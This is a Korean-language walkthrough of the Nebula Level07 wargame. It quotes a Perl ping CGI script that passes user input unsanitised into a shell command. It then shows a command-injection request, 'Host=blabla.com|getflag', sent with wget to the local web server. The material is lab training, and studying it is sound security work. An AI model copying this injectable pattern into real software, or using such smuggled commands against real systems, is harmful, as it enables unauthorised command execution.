# Exploit-exercise Nebula Level07

```
The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
```

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
    $host = $_[0];

    print("<html><head><title>Ping results</title></head><body><pre>");

    @output = `ping -c 3 $host 2>&1`;
    foreach $line (@output) { print "$line"; }

    print("</pre></body></html>");
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

먼저 처음 로그인 하여 `/home/flag07/` 경로로 가게 되면

`index.cgi` 파일과 `thttpd.conf` 파일이 있다.

`thttpd` 데몬을 사용하여 웹서버를 사용하는 것 같다..

위의 perl 스크립트 파일에서 `ping -c 3 $host 2>&1` 이 부분을 잘 확인하면 커맨드 인젝션이 나는 것을 확인할 수 있다.

`wget` 를 통해서 로컬 웹서버에 `blabla.com|getflag` 를 보내면 된다.

(난 이때 thttpd 가 켜져있지 않아서 직접 켜주었다. 방법은 맨 아래)

먼저 웹 서버는 로컬로 돌아가고 있을테고, 포트를 알아보면

`cat thttpd.conf | grep "port="` 라고 일벽하면 된다.

`port=7007` 이라는 결과가 나온다.

이제 `wget`의 결과를 제대로 받기 위해서 `cd ~` 를 통해 쓰기 권한이 있는 폴더로 이동한 다음,

`wget "http://127.0.0.1:7007/index.cgi?Host=blabla.com|getflag`

를 입력하고, `cat "index.cgi?Host=blabla.com|getflag"` 를 입력하면

```
<html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
</pre></body></html>
```

라고 뜨면서 풀리게 된다.

## 참고 : thttpd 켜는 방법

처음 로그인할 때 `nebula`, 비밀번호 `nebula` 로 로그인 한 다음 다음과 같은 명령어를 입력한다.

```
sudo su
/etc/init.d/thttpd stop
thttpd -C /home/flag07/thttpd.conf
/etc/init.d/thttpd start
```